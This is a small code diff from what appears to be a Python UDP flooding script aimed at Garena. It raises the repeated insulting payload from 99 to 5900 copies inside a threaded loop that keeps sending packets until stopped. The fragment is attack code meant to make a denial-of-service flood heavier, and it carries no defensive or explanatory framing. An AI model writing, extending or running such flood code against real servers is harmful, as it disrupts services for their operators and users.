@@ -7,7 +7,7 @@ active_threads = []
 
 def send_udp_packets(server_ip, server_port, thread_event):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = "fuck_garena" * 99
+    message = "fuck_garena" * 5900
 
     try:
         while not thread_event.is_set():
